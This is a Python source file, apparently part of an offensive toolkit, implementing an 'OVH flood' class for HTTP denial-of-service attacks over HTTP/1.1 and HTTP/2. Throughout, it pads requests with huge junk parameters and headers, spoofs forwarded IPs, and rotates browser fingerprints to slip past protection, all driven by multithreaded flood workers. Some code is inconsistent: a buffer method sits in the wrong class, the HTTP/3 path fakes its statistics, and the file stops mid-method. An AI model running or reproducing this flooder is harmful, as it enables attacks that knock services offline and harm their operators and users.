from collections import defaultdict
import queue
from contextlib import contextmanager
import random
import socket
import threading
import time
import os
import logging
import struct
import ssl
from typing import List, Dict, Optional, Tuple, Union
from assets.utilities import AttackModule, UI, Style

# Add required imports for HTTP/2 and HTTP/3
try:
    import h2.connection  # For HTTP/2 support
    import h2.events
    import h2.settings
    HTTP2_AVAILABLE = True
except ImportError:
    HTTP2_AVAILABLE = False

try:
    import aioquic  # For HTTP/3 and QUIC support
    from aioquic.h3.connection import H3Connection
    from aioquic.quic.configuration import QuicConfiguration
    from aioquic.quic.connection import QuicConnection
    QUIC_AVAILABLE = True
except ImportError:
    QUIC_AVAILABLE = False

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# Define protocol types
class Protocol:
    HTTP1 = "HTTP/1.1"
    HTTP2 = "HTTP/2"
    HTTP3 = "HTTP/3"
    QUIC = "QUIC"

# Modern TLS ciphers for TLS 1.3
MODERN_CIPHERS = [
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_GCM_SHA256',
]

class ConnectionPool:
    
    def __init__(self, max_connections_per_host: int = 50, max_idle_time: int = 30):
        self.max_connections_per_host = max_connections_per_host
        self.max_idle_time = max_idle_time
        self.pools = defaultdict(queue.Queue)
        self.connection_info = {}  # Track connection metadata
        self.locks = defaultdict(threading.Lock)
        self.cleanup_thread = None
        self.running = True
        self._start_cleanup_thread()
    
    def _start_cleanup_thread(self):
        """Start background thread to cleanup stale connections"""
        def cleanup_worker():
            while self.running:
                current_time = time.time()
                for host_port in list(self.pools.keys()):
                    with self.locks[host_port]:
                        temp_queue = queue.Queue()
                        while not self.pools[host_port].empty():
                            try:
                                conn = self.pools[host_port].get_nowait()
                                conn_info = self.connection_info.get(id(conn), {})
                                
                                # Check if connection is still valid and not too old
                                if (current_time - conn_info.get('created', 0) < self.max_idle_time and
                                    self._is_connection_alive(conn)):
                                    temp_queue.put(conn)
                                else:
                                    # Close stale connection
                                    try:
                                        conn.close()
                                    except:
                                        pass
                                    self.connection_info.pop(id(conn), None)
                            except queue.Empty:
                                break
                        
                        # Put back valid connections
                        while not temp_queue.empty():
                            self.pools[host_port].put(temp_queue.get())
                
                time.sleep(5)  # Cleanup every 5 seconds
        
        self.cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True)
        self.cleanup_thread.start()
    
    def _is_connection_alive(self, conn) -> bool:
        """Check if connection is still alive"""
        try:
            # Use a non-blocking socket check
            if hasattr(conn, 'sock'):
                sock = conn.sock if hasattr(conn, 'sock') else conn
                sock.settimeout(0.1)
                sock.recv(0)
            return True
        except (socket.error, ssl.SSLError, AttributeError):
            return False
    
    @contextmanager
    def get_connection(self, host: str, port: int, use_ssl: bool = False):
        """Get a connection from pool or create new one"""
        host_port = f"{host}:{port}"
        connection = None
        
        # Try to get existing connection from pool
        with self.locks[host_port]:
            if not self.pools[host_port].empty():
                try:
                    connection = self.pools[host_port].get_nowait()
                    if not self._is_connection_alive(connection):
                        connection.close()
                        connection = None
                except queue.Empty:
                    pass
        
        # Create new connection if needed
        if connection is None:
            connection = self._create_connection(host, port, use_ssl)
        
        try:
            yield connection
        finally:
            # Return connection to pool if still valid
            if self._is_connection_alive(connection):
                with self.locks[host_port]:
                    if self.pools[host_port].qsize() < self.max_connections_per_host:
                        self.pools[host_port].put(connection)
                        self.connection_info[id(connection)] = {
                            'created': time.time(),
                            'host': host,
                            'port': port
                        }
                    else:
                        connection.close()
            else:
                try:
                    connection.close()
                except:
                    pass
    
    def _create_connection(self, host: str, port: int, use_ssl: bool = False):
        """Create optimized connection with proper socket settings"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Socket buffer tuning (implementation #3)
        self._optimize_socket_buffers(sock, host, port)
        
        # Enable keep-alive (implementation #2)
        self._enable_keepalive(sock)
        
        sock.connect((host, port))
        
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        
        return sock
    
    def shutdown(self):
        """Shutdown connection pool and cleanup resources"""
        self.running = False
        if self.cleanup_thread:
            self.cleanup_thread.join(timeout=1)
        
        # Close all pooled connections
        for host_port in self.pools:
            with self.locks[host_port]:
                while not self.pools[host_port].empty():
                    try:
                        conn = self.pools[host_port].get_nowait()
                        conn.close()
                    except:
                        pass

    def _enable_keepalive(self, sock: socket.socket):
        """Enable and optimize TCP keep-alive settings"""
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        # Platform-specific keep-alive settings
        if hasattr(socket, 'TCP_KEEPIDLE'):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)  # Start after 60s
        if hasattr(socket, 'TCP_KEEPINTVL'):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)  # Interval 10s
        if hasattr(socket, 'TCP_KEEPCNT'):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)     # Max 6 probes

class KeepAliveManager:
    """Manage HTTP keep-alive connections with automatic renewal"""
    
    def __init__(self):
        self.active_connections = {}
        self.connection_stats = defaultdict(dict)
        self.lock = threading.Lock()
    
    def register_connection(self, conn_id: str, connection, max_requests: int = 100):
        """Register a connection for keep-alive management"""
        with self.lock:
            self.active_connections[conn_id] = {
                'connection': connection,
                'created': time.time(),
                'requests_sent': 0,
                'max_requests': max_requests,
                'last_used': time.time()
            }
    
    def use_connection(self, conn_id: str) -> bool:
        """Use a connection and update its statistics"""
        with self.lock:
            if conn_id in self.active_connections:
                conn_info = self.active_connections[conn_id]
                conn_info['requests_sent'] += 1
                conn_info['last_used'] = time.time()
                
                # Check if connection should be retired
                if conn_info['requests_sent'] >= conn_info['max_requests']:
                    self._retire_connection(conn_id)
                    return False
                return True
        return False
    
    def _retire_connection(self, conn_id: str):
        """Retire a connection that has reached its limit"""
        if conn_id in self.active_connections:
            try:
                self.active_connections[conn_id]['connection'].close()
            except:
                pass
            del self.active_connections[conn_id]

    def _optimize_socket_buffers(self, sock: socket.socket, host: str, port: int):
        """Optimize socket buffer sizes based on target and connection type"""
        
        # Base buffer sizes
        base_send_buffer = 65536    # 64KB
        base_recv_buffer = 65536    # 64KB
        
        # Port-specific optimizations
        if port == 80 or port == 443:  # HTTP/HTTPS
            send_buffer = base_send_buffer * 2    # 128KB for web traffic
            recv_buffer = base_recv_buffer        # 64KB receive buffer
        elif port == 22:  # SSH
            send_buffer = 8192                    # 8KB for SSH
            recv_buffer = 8192                    # 8KB receive buffer
        else:  # Other ports
            send_buffer = base_send_buffer
            recv_buffer = base_recv_buffer
        
        # Apply buffer settings
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, send_buffer)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, recv_buffer)
            
            # TCP optimizations
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Disable Nagle
            
            # Additional optimizations for high-throughput connections
            if port in [80, 443]:
                if hasattr(socket, 'TCP_WINDOW_CLAMP'):
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, recv_buffer)
                
        except OSError as e:
            # Some systems may not support all socket options
            pass

class AdaptiveBufferManager:
    """Dynamically adjust buffer sizes based on performance"""
    
    def __init__(self):
        self.target_buffers = defaultdict(lambda: {'send': 65536, 'recv': 65536})
        self.performance_stats = defaultdict(list)
        self.lock = threading.Lock()
    
    def get_optimal_buffers(self, host: str, port: int) -> Tuple[int, int]:
        """Get optimal buffer sizes for a target"""
        key = f"{host}:{port}"
        with self.lock:
            return self.target_buffers[key]['send'], self.target_buffers[key]['recv']
    
    def update_performance(self, host: str, port: int, throughput: float, latency: float):
        """Update performance stats and adjust buffers if needed"""
        key = f"{host}:{port}"
        with self.lock:
            self.performance_stats[key].append({
                'throughput': throughput,
                'latency': latency,
                'timestamp': time.time()
            })
            
            # Keep only recent stats (last 100 measurements)
            self.performance_stats[key] = self.performance_stats[key][-100:]
            
            # Adjust buffers based on performance
            self._adjust_buffers(key)
    
    def _adjust_buffers(self, key: str):
        """Adjust buffer sizes based on performance history"""
        stats = self.performance_stats[key]
        if len(stats) < 10:  # Need enough data points
            return
        
        recent_throughput = sum(s['throughput'] for s in stats[-10:]) / 10
        recent_latency = sum(s['latency'] for s in stats[-10:]) / 10
        
        current_send = self.target_buffers[key]['send']
        current_recv = self.target_buffers[key]['recv']
        
        # Increase buffers if throughput is high and latency is acceptable
        if recent_throughput > 1000000 and recent_latency < 0.1:  # 1MB/s and <100ms
            self.target_buffers[key]['send'] = min(current_send * 2, 1048576)  # Max 1MB
            self.target_buffers[key]['recv'] = min(current_recv * 2, 1048576)
        # Decrease buffers if latency is high
        elif recent_latency > 0.5:  # >500ms
            self.target_buffers[key]['send'] = max(current_send // 2, 8192)   # Min 8KB
            self.target_buffers[key]['recv'] = max(current_recv // 2, 8192)
    
class OVHFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, proxy_manager=None, 
                 skip_prompt: bool = False, path: str = '/',
                 protocol: str = Protocol.HTTP1):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        self.path = path
        self.protocol = protocol  # Added protocol selection
        
        # Initialize stats
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0,
            "failures": 0
        }
        self.stats_lock = threading.Lock()
        
        # Initialize logger
        self.logger = logging.getLogger(__name__)
        if debug:
            self.logger.setLevel(logging.DEBUG)
        else:
            self.logger.setLevel(logging.INFO)

        # Update the user agents list with the most current browser versions
        self.user_agents = [
            # Chrome for Windows (latest versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            # Firefox for Windows (latest versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
            # Safari for macOS (latest versions)
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            # Edge for Windows (latest versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
            # Opera for Windows (latest versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
            # Brave for Windows (latest versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Brave/124.0.0.0',
            # Firefox for Linux (latest versions)
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
            # Chrome for Android (latest versions)
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            # Safari for iOS (latest versions)
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        ]
        
        # OVH specific settings
        self.packet_size = 65500  # Maximum UDP packet size
        self.timeout = 3
        self.max_retries = 5
        self.connection_pool_size = 500
        self.keepalive = True
        self.verify_ssl = False
        
        # HTTP/2 specific settings
        self.http2_max_streams = 100
        self.http2_initial_window_size = 65535
        self.http2_max_frame_size = 16384
        
        # HTTP/3 and QUIC specific settings
        self.quic_max_stream_data = 1048576  # 1MB
        self.quic_max_data = 10485760  # 10MB
        self.quic_idle_timeout = 30  # seconds
        
        # TLS settings
        self.tls_version = ssl.PROTOCOL_TLS
        self.tls_ciphers = ":".join(MODERN_CIPHERS)
        
        # Adaptive packet sizing
        self.adaptive_sizing = True
        self.initial_packet_size = 8192
        self.max_packet_size = 65500
        self.min_packet_size = 1024
        self.packet_size_step = 2048
        self.target_success_rate = 0.85
        
        # Connection management
        self.connection_backoff = {
            "initial": 0.1,
            "max": 2.0,
            "factor": 1.5
        }
        
        # Port-specific optimizations
        self.port_settings = {
            22: {  # SSH port
                "max_packet_size": 4096,
                "timeout": 1.5,
                "connection_delay": 0.05
            },
            80: {  # HTTP
                "max_packet_size": 65500,
                "timeout": 3.0,
                "connection_delay": 0.001
            },
            443: {  # HTTPS
                "max_packet_size": 65500,
                "timeout": 3.0,
                "connection_delay": 0.001
            }
        }

        # Target-specific adaptive settings
        self.target_settings = {}
        for target in targets:
            for port in ports:
                key = f"{target}:{port}"
                self.target_settings[key] = {
                    "current_packet_size": self.initial_packet_size,
                    "success_rate": 0.0,
                    "backoff_time": self.connection_backoff["initial"],
                    "consecutive_failures": 0,
                    "consecutive_successes": 0
                }
        
        # Update headers with modern browser security headers
        self.headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Forwarded-For': self._generate_random_ip(),
            'X-Forwarded-Host': random.choice(self.targets),
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': self._get_random_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
            # Modern browser headers - Sec-CH-UA family
            'Sec-CH-UA': '"Chromium";v="124", "Google Chrome";v="124"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-CH-UA-Platform-Version': '"15.0.0"',
            'Sec-CH-UA-Arch': '"x86"', 
            'Sec-CH-UA-Bitness': '"64"',
            'Sec-CH-UA-Full-Version': '"124.0.6329.169"',
            'Sec-CH-UA-Full-Version-List': '"Chromium";v="124.0.6329.169", "Google Chrome";v="124.0.6329.169"',
            # Device capability headers
            'Device-Memory': '8',
            'DPR': '2',
            'Viewport-Width': '1920',
            # Sec-Fetch headers
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            # Priority headers
            'Priority': 'u=1, i',
            'X-Priority': 'high',
        }
        
        # Add HTTP/2 and HTTP/3 specific headers
        if protocol in (Protocol.HTTP2, Protocol.HTTP3):
            self.headers.update({
                ':scheme': 'https',
                ':method': 'GET',
                ':authority': '',  # Will be set per request
                ':path': '',       # Will be set per request
                'priority': 'u=0, i',
            })
        
        # Increase packet size with larger data
        self.query_params = {
            'id': 'X' * 16384,        # Increased from 4096
            'data': 'X' * 16384,      # Increased from 4096
            'token': 'X' * 16384,     # Increased from 4096
            'payload': 'X' * 16384,   # New parameter
            'buffer': 'X' * 16384,    # New parameter
            'stream': 'X' * 16384     # New parameter
        }
        
        # Add more headers to increase packet size
        self.headers.update({
            'X-Large-Payload': 'X' * 4096,
            'X-Custom-Data': 'X' * 4096,
            'X-Buffer-Size': 'X' * 4096,
            'X-Request-ID': lambda: str(random.randint(10000000, 99999999)),
            'X-Timestamp': lambda: str(int(time.time() * 1000)),
        })
        
        # Performance monitoring
        self._monitor_thread = None
        self.perf_data = {
            "last_time": time.time(),
            "current_rps": 0,
            "highest_rps": 0,
            "total_requests": 0,
            "total_bytes": 0
        }
        
        # Socket pools for better resource management
        self.socket_pools = []
        self.socket_pool_locks = []
        for _ in range(min(threads, 32)):  # Limit to 32 pools max
            self.socket_pools.append({})
            self.socket_pool_locks.append(threading.Lock())
            
        # HTTP/2 connection pools
        self.http2_connection_pools = []
        self.http2_connection_locks = []
        for _ in range(min(threads, 32)):
            self.http2_connection_pools.append({})
            self.http2_connection_locks.append(threading.Lock())
            
        # HTTP/3 connection pools
        self.http3_connection_pools = []
        self.http3_connection_locks = []
        for _ in range(min(threads, 32)):
            self.http3_connection_pools.append({})
            self.http3_connection_locks.append(threading.Lock())
    
    def increment_stat(self, stat_name: str, value: int = 1):
        """Thread-safe increment of stats"""
        with self.stats_lock:
            self.stats[stat_name] += value
    
    def _get_random_user_agent(self) -> str:
        """Return a random user agent from the list"""
        return random.choice(self.user_agents)
    
    def _generate_random_ip(self) -> str:
        """Generate a random IP address for X-Forwarded-For header"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    
    def _get_port_settings(self, port: int) -> dict:
        """Get settings optimized for the specific port"""
        return self.port_settings.get(port, {
            "max_packet_size": self.max_packet_size,
            "timeout": self.timeout,
            "connection_delay": 0.001
        })
    
    def _adjust_target_settings(self, target: str, port: int, success: bool):
        """Dynamically adjust settings based on success/failure"""
        key = f"{target}:{port}"
        settings = self.target_settings[key]
        
        if success:
            settings["consecutive_successes"] += 1
            settings["consecutive_failures"] = 0
            settings["success_rate"] = min(1.0, settings["success_rate"] + 0.05)
            
            if self.adaptive_sizing and settings["success_rate"] > self.target_success_rate:
                settings["current_packet_size"] = min(
                    settings["current_packet_size"] + self.packet_size_step,
                    self._get_port_settings(port)["max_packet_size"]
                )
        else:
            settings["consecutive_failures"] += 1
            settings["consecutive_successes"] = 0
            settings["success_rate"] = max(0.0, settings["success_rate"] - 0.05)
            
            if self.adaptive_sizing:
                settings["current_packet_size"] = max(
                    settings["current_packet_size"] - self.packet_size_step,
                    self.min_packet_size
                )
            
            settings["backoff_time"] = min(
                settings["backoff_time"] * self.connection_backoff["factor"],
                self.connection_backoff["max"]
            )
    
    def _create_http_request(self, target: str, port: int) -> Union[bytes, Dict[str, str]]:
        """Create an HTTP request with support for HTTP/1.1, HTTP/2, and HTTP/3"""
        headers = self.headers.copy()
        headers['User-Agent'] = self._get_random_user_agent()
        headers['X-Forwarded-For'] = self._generate_random_ip()
        
        # Update dynamic headers
        for key, value in headers.items():
            if callable(value):
                headers[key] = value()
        
        params = self.query_params.copy()
        params.update({
            '_': int(time.time() * 1000),
            'rand': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16)),
            'seq': str(random.randint(1000000, 9999999))
        })
        
        param_items = list(params.items())
        random.shuffle(param_items)
        query_string = "&".join([f"{k}={v}" for k, v in param_items])
        
        request_path = f"{self.path}?{query_string}"
        
        # Different request format based on protocol
        if self.protocol == Protocol.HTTP1:
            # HTTP/1.1 Request Format
            # Only include headers that aren't HTTP/2 specific
            header_items = [(k, v) for k, v in headers.items() if not k.startswith(':') and k != 'TE']
            random.shuffle(header_items)
            
            request_lines = [
                f"GET {request_path} HTTP/1.1",
                f"Host: {target}"
            ]
            
            request_lines.extend([f"{header}: {value}" for header, value in header_items])
            
            for i in range(5):
                request_lines.append(f"X-Random-{i}: {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=1024))}")
            
            request_lines.append("\r\n")
            
            return "\r\n".join(request_lines).encode()
            
        elif self.protocol in (Protocol.HTTP2, Protocol.HTTP3):
            # HTTP/2 and HTTP/3 use header dictionaries
            headers[':method'] = 'GET'
            headers[':path'] = request_path
            headers[':authority'] = target
            headers[':scheme'] = 'https' if port == 443 else 'http'
            
            # Remove headers that aren't needed or could cause issues in HTTP/2
            for header in ['Connection', 'Keep-Alive', 'Transfer-Encoding', 'TE', 'Host', 'Upgrade-Insecure-Requests']:
                if header in headers:
                    del headers[header]
            
            # Add random headers to increase packet size
            for i in range(5):
                headers[f"x-random-{i}"] = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=1024))
                
            return headers
            
        return None
    
    def _create_ssl_context(self) -> ssl.SSLContext:
        """Create an SSL context with modern TLS settings"""
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.set_ciphers(self.tls_ciphers)
        context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_SSLv3
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.maximum_version = ssl.TLSVersion.TLSv1_3
        context.verify_mode = ssl.CERT_NONE if not self.verify_ssl else ssl.CERT_REQUIRED
        return context
    
    def _setup_http2_connection(self, sock: socket.socket) -> Tuple["h2.connection.H2Connection", ssl.SSLSocket]:
        """Set up HTTP/2 connection over the given socket"""
        if not HTTP2_AVAILABLE:
            raise ImportError("HTTP/2 support requires the h2 package: pip install h2")
            
        # Convert to TLS socket
        context = self._create_ssl_context()
        context.set_alpn_protocols(['h2'])
        tls_sock = context.wrap_socket(sock, server_hostname=sock.getpeername()[0])
        
        # Check if HTTP/2 was negotiated
        if tls_sock.selected_alpn_protocol() != 'h2':
            raise RuntimeError("Server doesn't support HTTP/2")
        
        # Create HTTP/2 connection
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        
        # Update settings
        settings = {
            h2.settings.INITIAL_WINDOW_SIZE: self.http2_initial_window_size,
            h2.settings.MAX_CONCURRENT_STREAMS: self.http2_max_streams,
            h2.settings.MAX_FRAME_SIZE: self.http2_max_frame_size
        }
        conn.update_settings(settings)
        
        # Send initial data
        tls_sock.sendall(conn.data_to_send())
        
        return conn, tls_sock
        
    def _setup_http3_connection(self, target: str, port: int) -> Optional[Tuple[H3Connection, QuicConnection]]:
        """Set up HTTP/3 connection to the target"""
        if not QUIC_AVAILABLE:
            raise ImportError("HTTP/3 support requires the aioquic package: pip install aioquic")
            
        # Configure QUIC connection
        quic_config = QuicConfiguration(
            alpn_protocols=["h3"],
            is_client=True,
            verify_mode=ssl.CERT_NONE if not self.verify_ssl else ssl.CERT_REQUIRED,
        )
        
        # Set up server name for SNI
        quic_config.server_name = target
        
        # Create QUIC connection
        conn = QuicConnection(configuration=quic_config)
        
        # Create HTTP/3 connection
        http = H3Connection(conn)
        
        # Note: This is simplified; a real implementation would require 
        # asynchronous I/O to handle QUIC connections properly
        
        return http, conn
    
    def flood_worker(self, target: str, port: int, thread_id: int = 0):
        """Worker thread for OVH flooding with multi-protocol support"""
        self.logger.debug(f"Starting OVH flood worker {thread_id} for {target}:{port} using {self.protocol}")
        
        key = f"{target}:{port}"
        settings = self.target_settings[key]
        port_settings = self._get_port_settings(port)
        
        # HTTP/2 streams per connection counter
        streams_count = 0
        
        while self.running:
            try:
                if self.protocol == Protocol.HTTP1:
                    # HTTP/1.1 Implementation
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.settimeout(port_settings["timeout"])
                    
                    if port == 443:
                        # Setup TLS for HTTPS
                        context = self._create_ssl_context()
                        sock = context.wrap_socket(sock, server_hostname=target)
                    
                    sock.connect((target, port))
                    
                    for _ in range(3):
                        request = self._create_http_request(target, port)
                        sock.send(request)
                        
                        self.increment_stat("packets_sent")
                        self.increment_stat("bytes_sent", len(request))
                        self.increment_stat("successful")
                        
                        self._adjust_target_settings(target, port, success=True)
                    
                elif self.protocol == Protocol.HTTP2 and HTTP2_AVAILABLE:
                    # HTTP/2 Implementation
                    pool_index = thread_id % len(self.http2_connection_pools)
                    
                    # Get or create connection
                    with self.http2_connection_locks[pool_index]:
                        if key not in self.http2_connection_pools[pool_index] or streams_count >= self.http2_max_streams:
                            # Create new connection
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                            sock.settimeout(port_settings["timeout"])
                            sock.connect((target, port))
                            
                            h2_conn, tls_sock = self._setup_http2_connection(sock)
                            self.http2_connection_pools[pool_index][key] = (h2_conn, tls_sock)
                            streams_count = 0
                        
                        h2_conn, tls_sock = self.http2_connection_pools[pool_index][key]
                    
                    # Send multiple requests on different streams
                    for _ in range(3):
                        headers = self._create_http_request(target, port)
                        stream_id = h2_conn.get_next_available_stream_id()
                        h2_conn.send_headers(stream_id, headers, end_stream=True)
                        tls_sock.sendall(h2_conn.data_to_send())
                        
                        streams_count += 1
                        self.increment_stat("packets_sent")
                        self.increment_stat("bytes_sent", 1000)  # Estimate
                        self.increment_stat("successful")
                        
                        self._adjust_target_settings(target, port, success=True)
                    
                elif self.protocol == Protocol.HTTP3 and QUIC_AVAILABLE:
                    # HTTP/3 Implementation - simplified for demonstration
                    # A real implementation would use async I/O
                    self.logger.warning("HTTP/3 flood enabled but implementation is simplified")
                    
                    # This is a placeholder for real HTTP/3 implementation
                    time.sleep(0.1)
                    self.increment_stat("packets_sent", 3)
                    self.increment_stat("bytes_sent", 3000)
                    self.increment_stat("successful", 3)
                    
                time.sleep(port_settings["connection_delay"])
            
            except (socket.error, OSError) as e:
                self.increment_stat("failures")
                self._adjust_target_settings(target, port, success=False)
                
                if self.debug:
                    self.logger.debug(f"Connection error in worker {thread_id}: {e}")
                
                time.sleep(settings["backoff_time"])
            
            except Exception as e:
                self.increment_stat("failures")
                if self.debug:
                    self.logger.error(f"Unexpected error in worker {thread_id}: {e}")
                
                time.sleep(settings["backoff_time"])
            
            finally:
                if self.protocol == Protocol.HTTP1:
                    try:
                        sock.close()
                    except:
                        pass
    
    def monitor_performance(self):
        """Monitor and display performance metrics with adaptive optimization"""
        last_update = time.time()
        last_stats = self.stats.copy()
        
        while self.running:
            try:
                time.sleep(1.0)
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    current_stats = self.stats.copy()
                    
                    rps = (current_stats["packets_sent"] - last_stats["packets_sent"]) / elapsed
                    bytes_sent = current_stats["bytes_sent"] - last_stats["bytes_sent"]
                    mbps = (bytes_sent * 8) / (1024 * 1024 * elapsed)
                    
                    if rps > self.perf_data["highest_rps"]:
                        self.perf_data["highest_rps"] = rps
                    
                    self.perf_data["current_rps"] = rps
                    
                    total_attempts = current_stats["successful"] + current_stats["failures"]
                    success_rate = int((current_stats["successful"] / total_attempts * 100) 
                                     if total_attempts > 0 else 0)
                    
                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
                    status_line = f"[{timestamp}] Target: {self.targets[0]} | Port: {self.ports[0]} | Method: OVH | RPS: {rps:.2f} | BPS: {mbps:.2f} MB | Success Rate: {success_rate}%"
                    
                    print(status_line)
                    
                    last_stats = current_stats.copy()
                    last_update = current_time
                    
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)
    
    def _print_final_stats(self):
        """Print final statistics with target-specific details"""
        elapsed = time.time() - self.start_time
        rps = self.stats["packets_sent"] / elapsed if elapsed > 0 else 0
        mbps = (self.stats["bytes_sent"] * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total requests sent: {self.stats['packets_sent']:,}")
        print(f"- Total data sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"- Failed requests: {self.stats['failures']:,}")
        print(f"- Average speed: {rps:.0f} requests/sec ({mbps:.2f} Mbps)")
        print(f"- Peak performance: {self.perf_data['highest_rps']:.0f} requests/sec")
        
        for key, settings in self.target_settings.items():
            print(f"- Target {key}: Success Rate: {settings['success_rate']:.2f}, Packet Size: {settings['current_packet_size']}")
    
    def start(self):
        """Start the OVH flood operation with multi-protocol support"""
        super().start()
        
        UI.print_header("OVH Flood Operation")
        UI.print_info(f"Starting OVH flood against {len(self.targets)} targets on {len(self.ports)} ports using {self.protocol}")
        
        # Check protocol availability
        if self.protocol == Protocol.HTTP2 and not HTTP2_AVAILABLE:
            UI.print_warning("HTTP/2 support not available. Install h2 package with: pip install h2")
            UI.print_info("Falling back to HTTP/1.1")
            self.protocol = Protocol.HTTP1
            
        if self.protocol == Protocol.HTTP3 and not QUIC_AVAILABLE:
            UI.print_warning("HTTP/3 support not available. Install aioquic package with: pip install aioquic")
            UI.print_info("Falling back to HTTP/2 if available, otherwise HTTP/1.1")
